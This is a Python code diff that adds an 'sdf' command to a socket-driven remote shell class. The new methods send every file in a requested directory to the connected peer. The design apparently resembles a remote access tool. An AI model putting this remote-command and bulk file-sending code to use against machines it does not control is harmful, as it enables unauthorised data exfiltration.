@@ -78,6 +78,38 @@ class TCP:
                     break
         archivo.close()
 
+    def enviarDirectorio(self, origen, index):
+        archivos = []
+        for i in os.listdir(origen):
+            archivo = f"{origen}/{i}"
+            if os.path.isfile(archivo):
+                archivos.append(archivo)
+
+        sleep(0.2)
+        tam = len(archivos)
+        if index > tam:
+            index = 1
+        self.__sock.send(str(tam).encode())
+
+        while index <= tam:
+            nombre = self.getNombre(archivos[index-1])
+            peso = os.path.getsize(archivos[index-1])
+            paquetes = str(int(peso/self.__chunk))
+            info = nombre + '\n' + paquetes
+            sleep(0.1)
+            self.__sock.send(info.encode())
+
+            res = self.__sock.recv(1024).decode()
+            if res == 'S':
+                self.enviarArchivo(archivos[index-1])
+            elif res == "quit":
+                break
+            else:
+                pass
+
+            index += 1
+            sleep(0.05)
+
     def cd(self, directorio):
         if os.path.isdir(directorio):
             os.chdir(directorio)
@@ -142,6 +174,42 @@ class TCP:
         else:
             self.__sock.send(f"error: Imagen \"{imagen}\" no encontrada".encode())
 
+    def sendDirFrom(self, cmd):
+        if re.search("-d", cmd):
+            origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*) -d", cmd)[0]
+            if re.search("-i", cmd):
+                index = int(re.findall("-i[= ]([0-9. ].*)", cmd)[0])
+                if index <= 0:
+                    index = 1
+            else:
+                index = 1
+
+            if os.path.isdir(origen):
+                self.__sock.send("ok".encode())
+                self.enviarDirectorio(origen, index)
+
+            else:
+                self.__sock.send(f"error: Directorio \"{origen}\" no encontrado".encode())
+
+        else:
+            if re.search("-i", cmd):
+                origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*) -i", cmd)[0]
+                index = int(re.findall("-i[= ]([0-9. ].*)", cmd)[0])
+                if index <= 0:
+                    index = 1
+            else:
+                origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
+                index = 1
+
+            if os.path.isdir(origen):
+                self.__sock.send("ok".encode())
+                sleep(0.05)
+                self.__sock.send(self.getNombre(origen).encode())
+                self.enviarDirectorio(origen, index)
+
+            else:
+                self.__sock.send(f"error: Directorio \"{origen}\" no encontrado".encode())
+
     def shell(self):
         try:
             while True:
@@ -187,6 +255,13 @@ class TCP:
                 elif cmd.lower()[:3] == "img":
                     try:
                         self.image(cmd)
+
+                    except:
+                        continue
+
+                elif cmd.lower()[:3] == "sdf":
+                    try:
+                        self.sendDirFrom(cmd)
 
                     except:
                         continue
